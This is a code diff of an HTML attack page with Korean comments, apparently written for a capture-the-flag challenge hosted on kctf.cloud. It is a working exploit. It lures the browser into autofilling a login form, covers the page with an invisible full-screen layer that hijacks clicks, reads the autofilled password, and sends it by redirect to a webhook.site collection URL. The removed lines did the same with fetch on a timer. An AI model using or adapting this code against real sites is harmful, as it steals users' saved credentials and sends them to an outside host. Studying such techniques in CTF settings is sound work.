@@ -2,12 +2,23 @@
 <html>
 <head>
     <title>Loading...</title>
+    <style>
+        /* 2. 화면 전체를 덮는 투명 레이어 스타일 */
+        #click-hijacker {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            /* 투명하게 만듭니다. 디버깅 시에는 아래 주석을 풀어 색을 볼 수 있습니다. */
+            /* background-color: rgba(255, 0, 0, 0.1); */
+        }
+    </style>
 </head>
 <body>
-    <h1>Please wait, loading configuration...</h1>
-
-    <!-- 1. 자동 완성을 유발하는 모든 속성이 포함된 완전한 폼 -->
+    <!-- 1. 자동 완성을 유발하기 위한 폼 (화면에 보이지만 실제로는 레이어 뒤에 있음) -->
     <form id="login-form" action="https://autofill-web.k17.kctf.cloud/login" method="POST">
+        <h1>Please wait, loading configuration...</h1>
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" value="admin" autocomplete="username">
         <br>
@@ -17,27 +28,26 @@
         <input type="submit" value="Sign In">
     </form>
 
+    <!-- 2. 화면 전체를 덮는 클릭 가로채기용 투명 레이어 -->
+    <div id="click-hijacker"></div>
+
     <script>
         // (중요) 이 URL을 당신의 Webhook.site URL로 반드시 교체하세요!
         const webhookUrl = 'https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
+        const hijacker = document.getElementById('click-hijacker');
 
-        // 2. 요청 전송이 성공했던 setTimeout 방식으로 되돌립니다.
-        // 봇이 상호작용하는 시간(1초)에 맞춰 지연 시간을 설정합니다.
-        setTimeout(() => {
+        // 3. 투명 레이어에 클릭 이벤트 리스너를 추가
+        hijacker.addEventListener('click', () => {
             const stolenPassword = document.getElementById('password').value;
 
-            // 자동 완성이 성공했는지 확인
             if (stolenPassword) {
-                console.log("Password stolen:", stolenPassword);
-                // 훔친 비밀번호를 Webhook으로 전송
-                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`);
+                // 4. 비밀번호를 훔쳤으면 Webhook으로 강제 리다이렉트
+                window.location.href = `${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`;
             } else {
-                console.log("Autofill failed. Password field is still empty.");
-                // 디버깅을 위해 실패 메시지를 전송
-                fetch(`${webhookUrl}?error=autofill_failed_with_autocomplete`);
+                // 실패 시 디버깅 메시지 전송
+                window.location.href = `${webhookUrl}?error=autofill_failed_on_hijack_click`;
             }
-        }, 1000); // 1초 지연
-
+        });
     </script>
 </body>
 </html>
